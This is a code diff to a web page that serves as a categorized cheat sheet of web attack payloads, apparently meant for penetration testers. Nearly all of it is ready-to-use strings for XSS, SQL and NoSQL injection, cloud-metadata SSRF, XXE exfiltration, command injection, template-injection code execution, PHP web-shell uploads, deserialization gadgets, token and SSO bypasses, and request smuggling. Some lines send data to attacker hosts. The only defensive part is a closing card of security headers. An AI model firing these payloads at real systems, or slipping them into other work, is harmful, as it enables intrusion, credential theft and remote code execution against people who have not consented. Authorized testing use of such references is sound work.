@@ -336,6 +336,11 @@
     background: var(--bg-soft);
   }
 
+  .card-desc {
+    margin: -.1rem 0 .7rem; font-size: .8rem; line-height: 1.4;
+    color: color-mix(in oklab, var(--fg) 62%, transparent);
+  }
+
   .tags { display: flex; flex-wrap: wrap; gap: .3rem; margin-bottom: .8rem; }
   .tag {
     font-family: ui-monospace, monospace; font-size: .7rem;
@@ -592,151 +597,378 @@
    DATA — curated reference, all static, all our control.
    ============================================================ */
 const DATA = [
-  { id:"xss", title:"XSS", icon:"⚡", sev:"high", tags:["injection","client"], items:[
+  { id:"xss", title:"XSS (Reflected / Stored)", icon:"⚡", sev:"high", tags:["injection","client","html"],
+    desc:"Core reflected & stored XSS — tag/attribute breakouts, event handlers, and polyglots.", items:[
     "<script>alert(1)<\/script>",
     "<img src=x onerror=alert(document.domain)>",
     "<svg/onload=alert(1)>",
     "\"><svg onload=confirm(1)>",
     "javascript:alert(1)",
-    "<iframe srcdoc=\"<script>alert(1)<\/script>\"></iframe>",
+    "'-alert(1)-'",
     "<details open ontoggle=alert(1)>",
     "<body onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<select autofocus onfocus=alert(1)>",
+    "<video src onloadstart=alert(1)>",
+    "<marquee onstart=alert(1)>",
+    "<a href=javascript:alert(1)>x</a>",
+    '<iframe srcdoc="<script>alert(1)<\/script>"></iframe>',
     "';alert(String.fromCharCode(88,83,83))//",
-    "<math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src>\">"
+    "<math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src>\">",
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/<\/scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
   ]},
-  { id:"sqli", title:"SQL Injection", icon:"🗃️", sev:"crit", tags:["injection","server","database"], items:[
+  { id:"xss-dom", title:"DOM XSS / mXSS / Clobbering", icon:"🧬", sev:"high", tags:["client","dom","injection"],
+    desc:"Sink-based DOM XSS, mutation XSS, DOM clobbering, and sanitizer bypasses.", items:[
+    "#<img src=x onerror=alert(1)>   (location.hash -> innerHTML sink)",
+    "eval(location.hash.slice(1))",
+    "$(location.hash)   (jQuery selector -> HTML sink)",
+    "document.write(location.search)",
+    "element.setAttribute('href', userInput)   (javascript: sink)",
+    "<img name=currentScript src=x onerror=alert(1)>   (clobber document.currentScript)",
+    "<a id=x><a id=x name=y href=javascript:alert(1)>   (clobber x.y)",
+    "<form id=x><input id=y value=javascript:alert(1)>",
+    "<base href=//evil.com/>",
+    "<template shadowrootmode=open><img src=x onerror=alert(1)></template>",
+    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">   (mXSS)',
+    "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>   (mXSS)",
+    "<svg></p><style><a id=</style><img src=1 onerror=alert(1)></style>",
+    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>   (DOMPurify mXSS)",
+    "window.postMessage('<img src=x onerror=alert(1)>','*')"
+  ]},
+  { id:"csp", title:"CSP Bypass", icon:"🛡️", sev:"med", tags:["client","bypass","defense"],
+    desc:"Defeating Content-Security-Policy — JSONP gadgets, base-uri, nonce reuse, strict-dynamic abuse.", items:[
+    "<script src=//accounts.google.com/o/oauth2/revoke?callback=alert(1)><\/script>   (JSONP gadget)",
+    "<script src=//www.google.com/complete/search?client=chrome&jsonp=alert(1)><\/script>",
+    "<base href=//evil.com/><script nonce=LEAKED src=app.js><\/script>",
+    "ng-app ng-csp><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js><\/script>{{$on.curry.call().alert(1)}}",
+    "<script src=\"data:text/javascript,alert(1)\"><\/script>",
+    "<object data=\"data:text/html,<script>alert(1)<\/script>\">",
+    "<script nonce=REUSED_NONCE>alert(1)<\/script>   (nonce reuse)",
+    "strict-dynamic: a trusted script does s=document.createElement('script');s.src='//evil';document.body.append(s)",
+    "<link rel=prefetch href=//evil.com/?leak>   (data exfil under connect-src)",
+    "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">"
+  ]},
+  { id:"sqli", title:"SQL Injection", icon:"🗃️", sev:"crit", tags:["injection","database","server"],
+    desc:"Auth bypass, UNION, error-based, blind boolean/time, OOB exfil, and WAF-tolerant syntax.", items:[
     "' OR '1'='1' -- -",
     "\" OR \"\"=\"",
-    "' UNION SELECT NULL,version(),NULL -- -",
-    "1) OR 1=1 -- -",
     "admin' -- -",
-    "' AND SLEEP(5) -- -",
-    "' OR 1=1 LIMIT 1 -- -",
+    "') OR ('1'='1' -- -",
+    "' UNION SELECT NULL,version(),NULL -- -",
     "1' ORDER BY 10 -- -",
     "0 UNION ALL SELECT NULL,@@version,NULL,NULL -- -",
-    "'; WAITFOR DELAY '0:0:5' -- -"
+    "' AND SLEEP(5) -- -",
+    "1' AND IF(1=1,SLEEP(5),0) -- -",
+    "'; WAITFOR DELAY '0:0:5' -- -   (MSSQL)",
+    "1') AND pg_sleep(5) -- -   (Postgres)",
+    "' AND extractvalue(1,concat(0x7e,(SELECT version()))) -- -   (error-based)",
+    "' AND 1=CONVERT(int,(SELECT @@version)) -- -   (MSSQL error)",
+    "1; EXEC xp_cmdshell('whoami') -- -",
+    "' or JSON_LENGTH('{}')<=8896 union select @@version#   (JSON WAF bypass)",
+    "'+(SELECT 1 FROM dual WHERE 1=1)+'   (Oracle)",
+    "'/**/UnIoN/**/SeLeCT/**/1,2,3-- -   (comment/case WAF bypass)"
   ]},
-  { id:"ssrf", title:"SSRF", icon:"🌐", sev:"high", tags:["server","network"], items:[
+  { id:"nosql", title:"NoSQL & ORM Injection", icon:"🍃", sev:"high", tags:["injection","database","nosql"],
+    desc:"Mongo operators, $where JS, regex extraction, and framework ORM leaks (Django, Ransack, Prisma).", items:[
+    '{"username":{"$ne":null},"password":{"$ne":null}}',
+    '{"username":{"$gt":""},"password":{"$gt":""}}',
+    '{"username":"admin","password":{"$regex":"^a"}}',
+    "username[$ne]=x&password[$ne]=x",
+    '{"$where":"sleep(5000)"}',
+    "';return true;var x='",
+    '{"username":{"$in":["admin","root"]},"password":{"$gt":""}}',
+    "password__startswith=pbkdf2_sha256$   (Django ORM leak)",
+    "?q[password_cont]=secret   (Ransack)",
+    '{"password":{"contains":"a"}}   (Prisma operator injection)',
+    '{"id":"10","id":"100"}   (duplicate key confusion)'
+  ]},
+  { id:"ssrf", title:"SSRF", icon:"🌐", sev:"high", tags:["server","cloud","network"],
+    desc:"Cloud metadata (AWS/GCP/Azure/OCI/Alibaba), IP-format & encoding bypass, DNS rebind, gopher.", items:[
     "http://127.0.0.1/",
     "http://localhost:80/admin",
     "http://[::1]/",
-    "http://0.0.0.0:8080/",
-    "http://169.254.169.254/latest/meta-data/",
-    "http://metadata.google.internal/computeMetadata/v1/",
-    "gopher://127.0.0.1:6379/_INFO",
-    "file:///etc/passwd",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+    "http://100.100.100.200/latest/meta-data/   (Alibaba)",
+    "http://169.254.169.254/opc/v2/instance/   (Oracle OCI)",
+    "http://2130706433/   (decimal)",
+    "http://0x7f000001/   (hex)",
+    "http://017700000001/   (octal)",
+    "http://[::ffff:169.254.169.254]/",
+    "http://allowed.com@169.254.169.254/",
+    "http://169.254.169.254#.allowed.com/",
+    "gopher://127.0.0.1:6379/_SET%20pwned%20true   (Redis via gopher)",
     "dict://127.0.0.1:11211/stats",
-    "http://2130706433/  (decimal localhost)"
+    "file:///etc/passwd",
+    "7f000001.a9fea9fe.rbndr.us   (DNS rebinding)"
   ]},
-  { id:"xxe", title:"XXE", icon:"📄", sev:"high", tags:["injection","xml"], items:[
+  { id:"xxe", title:"XXE", icon:"📄", sev:"high", tags:["injection","xml","server"],
+    desc:"File read, blind OOB exfil via parameter entities, PHP wrappers, and SVG/Office XXE.", items:[
     "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>",
+    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><r>&x;</r>",
     "<!DOCTYPE foo [<!ENTITY % ext SYSTEM \"http://attacker/x.dtd\"> %ext;]>",
-    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'http://169.254.169.254/'>]><r>&x;</r>",
-    "<!DOCTYPE r [<!ENTITY % p SYSTEM \"file:///etc/passwd\"><!ENTITY % q \"<!ENTITY exfil SYSTEM 'http://a/?d=%p;'>\">%q;]>"
+    "<!DOCTYPE r [<!ENTITY % p SYSTEM \"file:///etc/passwd\"><!ENTITY % q \"<!ENTITY exfil SYSTEM 'http://a/?d=%p;'>\">%q;]>",
+    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><r>&x;</r>",
+    "<!DOCTYPE test [<!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\">%init;]>",
+    "<svg xmlns=\"http://www.w3.org/2000/svg\"><image xlink:href=\"file:///etc/hostname\"></svg>   (SVG XXE)",
+    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'expect://id'>]><r>&x;</r>",
+    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'netdoc:///etc/passwd'>]><r>&x;</r>"
   ]},
-  { id:"lfi", title:"LFI / Path Traversal", icon:"📁", sev:"high", tags:["server","files"], items:[
+  { id:"lfi", title:"LFI / Path Traversal", icon:"📁", sev:"high", tags:["server","files","traversal"],
+    desc:"Encoding tricks, PHP wrappers, log poisoning, /proc, and null-byte truncation.", items:[
     "../../../../etc/passwd",
     "....//....//....//etc/passwd",
     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    "..%c0%af..%c0%afetc/passwd",
-    "/etc/passwd%00.png",
+    "..%252f..%252f..%252fetc/passwd   (double URL-encode)",
+    "..%c0%af..%c0%afetc/passwd   (overlong UTF-8)",
+    "/etc/passwd%00.png   (null byte)",
     "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=string.rot13/resource=index.php",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
     "expect://id",
+    "/proc/self/environ   (log/env poisoning -> RCE)",
+    "/var/log/apache2/access.log",
+    "....\\....\\....\\windows\\win.ini",
     "C:\\Windows\\System32\\drivers\\etc\\hosts"
   ]},
-  { id:"rce", title:"Command Injection", icon:"💻", sev:"crit", tags:["server","exec"], items:[
+  { id:"rce", title:"Command Injection", icon:"💻", sev:"crit", tags:["injection","server","exec"],
+    desc:"Separators, blind/OOB triggers, $IFS & brace-expansion filter bypass, and Windows variants.", items:[
     "; id",
     "| id",
     "&& whoami",
     "`id`",
     "$(id)",
     "; cat /etc/passwd #",
+    "|| ping -c 3 collaborator.net",
+    "; curl http://attacker/$(whoami)",
     "127.0.0.1; sleep 5",
-    "$(curl http://attacker/`id`)"
+    "%0aid",
+    ";{cat,/etc/passwd}   (brace expansion)",
+    "$IFS$9id   (space filter bypass)",
+    "$(printf '\\x69\\x64')   (hex-encoded 'id')",
+    "a]&&id||a[",
+    "& tasklist   (Windows)",
+    "| type C:\\Windows\\System32\\drivers\\etc\\hosts   (Windows)"
   ]},
-  { id:"ssti", title:"SSTI (Templates)", icon:"🧩", sev:"high", tags:["injection","template"], items:[
+  { id:"ssti", title:"SSTI (Templates)", icon:"🧩", sev:"crit", tags:["injection","template","server"],
+    desc:"Detection to RCE across Jinja2, Twig, Freemarker, Velocity, Smarty, and Node engines.", items:[
     "{{7*7}}",
     "${7*7}",
     "<%= 7*7 %>",
-    "{{config.items()}}",
-    "{{''.__class__.__mro__[1].__subclasses__()}}",
-    "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
-    "#set($x=$context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'))"
+    "#{7*7}",
+    "{{7*'7'}}   (Jinja2 vs Twig fingerprint)",
+    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "{{['id']|filter('system')}}   (Twig)",
+    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}   (Twig)",
+    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}   (Freemarker)",
+    "${T(java.lang.Runtime).getRuntime().exec('id')}   (Spring SpEL)",
+    "#set($x=$context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'))   (Velocity/OGNL)",
+    "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}   (Node)"
   ]},
-  { id:"nosql", title:"NoSQL Injection", icon:"🍃", sev:"high", tags:["injection","database"], items:[
-    "{\"$ne\": null}",
-    "{\"$gt\": \"\"}",
-    "user[$ne]=&pass[$ne]=",
-    "{\"$where\": \"sleep(5000)\"}",
-    "';return true;var x='",
-    "{\"username\":{\"$regex\":\"^a\"}}"
+  { id:"upload", title:"File Upload Bypass", icon:"📤", sev:"high", tags:["server","files","bypass"],
+    desc:"Extension & content-type tricks, magic-byte polyglots, and .htaccess / web.config overrides.", items:[
+    "shell.php.jpg   (double extension)",
+    "shell.phtml / shell.php5 / shell.phar",
+    "shell.pHp   (case trick)",
+    "shell.php%00.jpg   (null byte)",
+    "shell.php;.jpg / shell.asp;.jpg   (IIS semicolon)",
+    "shell.php::$DATA   (Windows ADS)",
+    "GIF89a;<?php system($_GET[0]);?>   (magic-byte polyglot)",
+    "Content-Type: image/jpeg on shell.php",
+    ".htaccess -> AddType application/x-httpd-php .jpg",
+    "web.config -> add handler mapping *.jpg to PHP/ASP",
+    "shell.svg -> <svg onload=alert(1)>",
+    "../../shell.php   (path traversal in filename)"
   ]},
-  { id:"jwt", title:"JWT Pitfalls", icon:"🔑", sev:"high", tags:["auth","token"], items:[
-    "alg: none -> eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
-    "alg confusion: HS256 signed with RSA public key",
-    "kid path traversal: \"kid\":\"../../dev/null\"",
-    "weak secret bruteforce: hashcat -m 16500 jwt.txt rockyou.txt",
-    "embedded jwk header (jku/jwk) pointing to attacker key"
+  { id:"deserial", title:"Deserialization", icon:"📦", sev:"crit", tags:["server","exec","deserialization"],
+    desc:"Java (ysoserial), .NET ViewState/JSON, PHP POP/phar, Python pickle, Ruby Marshal, Node.", items:[
+    "Java: ysoserial CommonsCollections5 'curl http://a/$(id)'",
+    "Java URLDNS gadget (blind detection): rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA...",
+    ".NET: ysoserial.net -g TypeConfuseDelegate -f Json.Net -c calc",
+    ".NET ViewState: ysoserial.net -p ViewState -g TextFormattingRunProperties -c cmd --generator=...",
+    "PHP: O:8:\"stdClass\":1:{s:4:\"data\";s:3:\"PoC\";}   (object injection / POP chain)",
+    "PHP phar: phar://uploaded.jpg   (metadata unserialize)",
+    "Python pickle: cos\\nsystem\\n(S'id'\\ntR.",
+    "Python YAML: !!python/object/apply:os.system ['id']",
+    "Ruby Marshal: \\x04\\x08o:...",
+    "Node node-serialize: _$$ND_FUNC$$_function(){require('child_process').exec('id')}()"
   ]},
-  { id:"csrf", title:"CSRF Tricks", icon:"🪤", sev:"med", tags:["auth","client"], items:[
+  { id:"protop", title:"Prototype Pollution", icon:"⚙️", sev:"high", tags:["client","node","injection"],
+    desc:"Client & server gadgets via query/JSON, and RCE through NODE_OPTIONS / EJS / child_process.", items:[
+    "?__proto__[admin]=true",
+    "?constructor[prototype][admin]=true",
+    '{"__proto__":{"isAdmin":true}}',
+    '{"constructor":{"prototype":{"isAdmin":true}}}',
+    "a[__proto__][polluted]=true",
+    "Object.assign({}, JSON.parse('{\"__proto__\":{\"x\":1}}'))",
+    '{"__proto__":{"status":510}}   (Express DoS gadget)',
+    '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}',
+    '{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=evil.com"}}',
+    '{"__proto__":{"client":1,"escapeFunction":"1;return process.mainModule.require(\'child_process\').execSync(\'id\')"}}   (EJS RCE)'
+  ]},
+  { id:"jwt", title:"JWT / Token Attacks", icon:"🔑", sev:"high", tags:["auth","token","jwt"],
+    desc:"alg:none, RS256->HS256 confusion, kid traversal/SQLi, jku/jwk injection, weak-secret brute.", items:[
+    "alg:none -> eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.   (keep trailing dot)",
+    "RS256 -> HS256 confusion: sign with the RSA public key as HMAC secret",
+    "kid path traversal: \"kid\":\"../../../../dev/null\" + empty HS256 secret",
+    "kid SQLi: \"kid\":\"x' UNION SELECT 'attacker_key'-- \"",
+    "jku injection: \"jku\":\"https://evil.com/jwks.json\"",
+    "embedded jwk header: \"jwk\":{\"kty\":\"RSA\",\"n\":\"...\",\"e\":\"AQAB\"}",
+    "x5u injection: \"x5u\":\"https://evil.com/cert.pem\"",
+    "weak secret brute: hashcat -m 16500 jwt.txt rockyou.txt",
+    "claim tampering: {\"sub\":\"attacker\",\"role\":\"admin\"}",
+    "expired token replay (check exp/nbf enforcement)"
+  ]},
+  { id:"oauth", title:"OAuth 2.0 / OIDC", icon:"🪪", sev:"high", tags:["auth","oauth","sso"],
+    desc:"redirect_uri confusion, state/nonce removal, code leakage, and mutable-claim account takeover.", items:[
+    "redirect_uri=https://client.com/callback/../fakepath",
+    "redirect_uri=https://client.com/callback%2f%2e%2e%2ffake",
+    "redirect_uri=https://client.com@evil.com",
+    "redirect_uri=https://client.com.evil.com",
+    "redirect_uri=https://client.com%23.evil.com",
+    "response_type=code id_token   (force fragment leak)",
+    "response_mode=fragment   (strand code in #)",
+    "state=   (removed -> login CSRF)",
+    "nonce=   (removed -> ID token replay)",
+    "aud=attacker_client_id   (client confusion)",
+    "mutable claim: unverified {\"email\":\"victim@target.com\"} from attacker tenant",
+    "scope=openid profile email offline_access   (over-broad grant)"
+  ]},
+  { id:"saml", title:"SAML Bypass", icon:"🏛️", sev:"high", tags:["auth","saml","sso"],
+    desc:"Signature exclusion & wrapping (XSW 1-8), comment injection, parser differentials, replay.", items:[
+    "Remove the <Signature> element entirely   (signature exclusion)",
+    "XSW #1: clone assertion, wrap original in <Extensions>",
+    "XSW #2: detach assertion, wrap in a new <Response>",
+    "XSW #3: move assertion into <Signature><Object>",
+    "NameID comment injection: admin@target.com<!--x-->.evil.com",
+    "Assertion unsigned but Response signed   (scope mismatch)",
+    "DOCTYPE differential (REXML vs Nokogiri) to smuggle a second assertion",
+    "Replay a valid SAML Response   (check NotOnOrAfter / OneTimeUse)",
+    "InResponseTo removed   (check binding enforcement)"
+  ]},
+  { id:"cors", title:"CORS Misconfiguration", icon:"↔️", sev:"med", tags:["client","cors","misconfig"],
+    desc:"Origin reflection, null origin, prefix/suffix matching, and credentialed cross-origin reads.", items:[
+    "Origin: https://evil.com   (test reflection in ACAO)",
+    "Origin: null   (sandboxed iframe / data: doc)",
+    "Origin: https://target.com.evil.com   (suffix match)",
+    "Origin: https://evil-target.com   (prefix match)",
+    "Origin: https://sub.target.com   (wildcard subdomain trust)",
+    "Origin: https://target.com%60.evil.com   (backtick parser trick)",
+    "fetch('https://target.com/api/me',{credentials:'include'})   (exfil if ACAC:true)",
+    "check for Access-Control-Allow-Credentials: true with reflected origin"
+  ]},
+  { id:"csrf", title:"CSRF Tricks", icon:"🪤", sev:"med", tags:["auth","client","csrf"],
+    desc:"Auto-submitting forms, GET side effects, and SameSite / token-validation bypasses.", items:[
     "<form action=https://target/transfer method=POST><input name=to value=evil><input name=amt value=1000></form><script>document.forms[0].submit()<\/script>",
     "<img src=\"https://target/api/delete?id=1\">",
     "fetch('https://target/api',{method:'POST',credentials:'include',body:'x=1'})",
-    "SameSite bypass: top-level GET navigation"
+    "SameSite=Lax bypass: top-level GET navigation with side effects",
+    "method override: POST with _method=DELETE or X-HTTP-Method-Override",
+    "empty/removed CSRF token accepted (check token validation)",
+    "swap victim token for attacker's (token not bound to session)",
+    "Content-Type: text/plain to skip CORS preflight on JSON endpoints"
   ]},
-  { id:"open-redirect", title:"Open Redirect", icon:"↪️", sev:"low", tags:["client","auth"], items:[
+  { id:"idor", title:"IDOR / Access Control", icon:"🔓", sev:"high", tags:["authz","logic","api"],
+    desc:"Object & UUID enumeration, method/param tampering, mass assignment, and route confusion.", items:[
+    "GET /api/user/1001  ->  change to /1002",
+    "GET /api/invoice/00001  ->  /00002   (sequential IDs)",
+    "id=SELF  ->  id=OTHER_UUID leaked in a prior response",
+    "?userId=123  ->  ?userId[]=123   (type juggling)",
+    "wrap id: {\"id\":\"123\"} vs {\"id\":123}",
+    "mass assignment: POST /api/user {\"id\":1,\"role\":\"admin\"}",
+    "PUT /api/user/123 {\"isAdmin\":true}",
+    "header trust: X-User-Id: 2 / X-Forwarded-For: 127.0.0.1",
+    "method swap: GET blocked -> try POST/PUT/PATCH/DELETE",
+    "path bypass: /admin 403 -> /Admin, /admin/, /admin/.",
+    "version pivot: /api/v1/ blocked -> /api/v2/ or /api/internal/",
+    "GraphQL node(id:) global object enumeration"
+  ]},
+  { id:"open-redirect", title:"Open Redirect", icon:"↪️", sev:"low", tags:["client","redirect","auth"],
+    desc:"Protocol-relative, backslash & @ tricks, URL-parser differentials, and javascript:/data: URIs.", items:[
     "//evil.com",
     "/\\evil.com",
+    "////evil.com",
     "https://target.com@evil.com",
     "https://target.com.evil.com",
+    "https://evil.com%23.target.com",
+    "https:evil.com",
+    "/%0d/evil.com",
+    "///evil.com/%2f..",
     "javascript://%0aalert(1)"
   ]},
-  { id:"crlf", title:"CRLF / Header Injection", icon:"📡", sev:"med", tags:["server","http"], items:[
+  { id:"crlf", title:"CRLF / Header Injection", icon:"📡", sev:"med", tags:["server","http","injection"],
+    desc:"Response splitting, cookie / Location injection, and cache poisoning via header injection.", items:[
     "%0d%0aSet-Cookie:%20admin=true",
-    "%E5%98%8A%E5%98%8DSet-Cookie:%20admin=true",
-    "User-Agent: <svg onload=alert(1)>",
-    "X-Forwarded-For: 127.0.0.1, evil",
-    "Host: evil.com"
+    "%0d%0aLocation:%20https://evil.com",
+    "%E5%98%8A%E5%98%8DSet-Cookie:%20admin=true   (Unicode CR/LF)",
+    "%u000d%u000aSet-Cookie:%20evil=true",
+    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)<\/script>",
+    "User-Agent: <svg onload=alert(1)>   (stored via logs/headers)",
+    "X-Forwarded-Host: evil.com   (cache poisoning / reset link)",
+    "Host: evil.com   (password-reset poisoning)"
   ]},
-  { id:"deserial", title:"Deserialization", icon:"📦", sev:"crit", tags:["server","exec"], items:[
-    "Java: ysoserial CommonsCollections1 'curl http://a/`id`'",
-    ".NET: ysoserial.net -g TypeConfuseDelegate -f Json.Net -c calc",
-    "PHP: O:8:\"stdClass\":1:{s:4:\"data\";s:3:\"PoC\";}",
-    "Python pickle: cos\\nsystem\\n(S'id'\\ntR.",
-    "Node node-serialize: _$$ND_FUNC$$_function(){require('child_process').exec('id')}()"
+  { id:"graphql", title:"GraphQL", icon:"🕸️", sev:"med", tags:["api","server","graphql"],
+    desc:"Introspection, batching/aliasing DoS, field enumeration, injection, and IDOR via node().", items:[
+    "{__schema{types{name fields{name}}}}   (introspection)",
+    "{__type(name:\"User\"){fields{name type{name}}}}",
+    "query{user(id:\"1' OR '1'='1\"){id}}   (injection into resolver)",
+    "mutation{updateUser(id:1,input:{role:\"admin\"}){id role}}",
+    "[{query:\"{u1:user(id:1){pw}}\"},{query:\"{u2:user(id:2){pw}}\"}]   (batching)",
+    "{a:user(id:1){pw} b:user(id:2){pw} c:user(id:3){pw}}   (alias brute force)",
+    "{user{id id id id id}}   (field duplication DoS)",
+    "query{node(id:\"VXNlcjox\"){... on User{email}}}   (global node IDOR)",
+    "query @deprecated {__typename}",
+    "disable introspection? try suggestions: {usr}  ->  'Did you mean user?'"
   ]},
-  { id:"protop", title:"Prototype Pollution", icon:"🧬", sev:"high", tags:["client","node"], items:[
-    "?__proto__[admin]=true",
-    "?constructor[prototype][admin]=true",
-    "{\"__proto__\":{\"polluted\":1}}",
-    "Object.assign({}, JSON.parse('{\"__proto__\":{\"x\":1}}'))"
+  { id:"race", title:"Race Conditions", icon:"⏱️", sev:"high", tags:["server","logic","race"],
+    desc:"Single-packet attack, limit-overrun, TOCTOU windows, and coupon / OTP reuse.", items:[
+    "Single-packet attack: last-byte sync across 20+ connections (HTTP/2)",
+    "Turbo Intruder: race-single-packet.py",
+    "Limit overrun: 20x parallel POST /transfer",
+    "Coupon reuse: 50 concurrent POST /apply-coupon",
+    "2FA brute: 10000 concurrent POST /verify-otp",
+    "TOCTOU: read-then-act window on /withdraw balance check",
+    "Idempotency bypass: 30x POST /redeem-voucher",
+    "Follower count: POST /follow + DELETE /follow raced",
+    "Upload + rename race (write executes before validation)"
   ]},
-  { id:"graphql", title:"GraphQL", icon:"🕸️", sev:"med", tags:["api","server"], items:[
-    "{__schema{types{name fields{name}}}}  // introspection",
-    "query{user(id:\"1' OR '1'='1\"){id}}",
-    "mutation{login(u:\"admin\",p:\"' OR 1=1--\"){token}}",
-    "Batching attack: [{q1},{q2},...] x 1000",
-    "Field duplication: {user{id id id id}}  // resource exhaustion"
+  { id:"smuggling", title:"HTTP Request Smuggling", icon:"🚇", sev:"crit", tags:["server","http","desync"],
+    desc:"CL.TE / TE.CL / TE.TE, HTTP/2 downgrade (H2.CL / H2.TE) desync, and cache poisoning.", items:[
+    "CL.TE: Content-Length: 6  +  Transfer-Encoding: chunked",
+    "TE.CL: Transfer-Encoding: chunked  +  Content-Length: 4",
+    "TE.TE obfuscation: \"Transfer-Encoding: chunked\" + \"Transfer-Encoding: x\"",
+    "TE line folding: \"Transfer-Encoding:\\r\\n chunked\"",
+    "TE hex smuggle: \"Transfer-Encoding: chunke\\x64\"",
+    "H2.CL desync: HTTP/2 request with content-length: 0 downgraded to HTTP/1.1",
+    "H2.TE desync: HTTP/2 request carrying transfer-encoding: chunked",
+    "CRLF in H2 header value -> request splitting on downgrade",
+    "smuggle prefix: 0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: target"
   ]},
-  { id:"race", title:"Race Conditions", icon:"⏱️", sev:"high", tags:["server","logic"], items:[
-    "Last-byte sync: hold N TLS frames, release together (single-packet attack)",
-    "Turbo-Intruder: race-single-packet.py",
-    "Coupon double-spend: parallel POST /redeem N times",
-    "TOCTOU: read-then-act windows on /transfer endpoints"
+  { id:"ws", title:"WebSocket Attacks", icon:"🔌", sev:"med", tags:["client","websocket","api"],
+    desc:"Cross-site WebSocket hijacking (CSWSH), message injection, and auth / JSON-RPC abuse.", items:[
+    "new WebSocket('wss://target/ws') from evil origin   (CSWSH — no CORS on WS)",
+    "Origin: https://evil.com   (check handshake origin validation)",
+    "{\"type\":\"subscribe\",\"channel\":\"../admin\"}",
+    "{\"type\":\"message\",\"data\":\"<img src=x onerror=alert(1)>\"}   (stored XSS via WS)",
+    "{\"type\":\"sqli\",\"query\":\"1' OR '1'='1\"}",
+    "{\"__proto__\":{\"isAdmin\":true},\"action\":\"getUsers\"}",
+    "{\"type\":\"auth\",\"token\":\"\",\"role\":\"admin\"}",
+    "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"admin.getConfig\"}"
   ]},
-  { id:"smuggling", title:"HTTP Request Smuggling", icon:"🚇", sev:"crit", tags:["server","http"], items:[
-    "CL.TE: Content-Length: 6 / Transfer-Encoding: chunked",
-    "TE.CL: TE: chunked / CL: 4",
-    "TE.TE obfuscation: \"Transfer-Encoding : chunked\" / \"Transfer-encoding: x\"",
-    "H2.CL desync (HTTP/2 downgrade): :method POST / content-length: 0"
-  ]},
-  { id:"headers", title:"Security Headers (defense)", icon:"🛡️", sev:"low", tags:["defense","http"], items:[
-    "Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'self'",
+  { id:"headers", title:"Security Headers (defense)", icon:"🛡️", sev:"low", tags:["defense","http","headers"],
+    desc:"Defensive baseline — response headers that neutralise many of the payload classes above.", items:[
+    "Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'self'; require-trusted-types-for 'script'",
     "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
+    "X-Content-Type-Options: nosniff",
     "Referrer-Policy: strict-origin-when-cross-origin",
     "Permissions-Policy: camera=(), microphone=(), geolocation=()",
     "Cross-Origin-Opener-Policy: same-origin",
-    "Cross-Origin-Embedder-Policy: require-corp"
+    "Cross-Origin-Embedder-Policy: require-corp",
+    "Cross-Origin-Resource-Policy: same-origin",
+    "Set-Cookie: __Host-sid=...; Secure; HttpOnly; SameSite=Lax; Path=/"
   ]}
 ];
 
@@ -934,6 +1166,7 @@ function makeCard(c) {
   for (const { p, idx } of c._items) list.appendChild(makeItem(c.id, p, idx));
 
   card.appendChild(head);
+  if (c.desc) card.appendChild(el("p", { class: "card-desc", text: c.desc }));
   card.appendChild(tags);
   card.appendChild(list);
 
@@ -965,6 +1198,7 @@ function renderGrid() {
           if (!q) return true;
           return p.toLowerCase().includes(q)
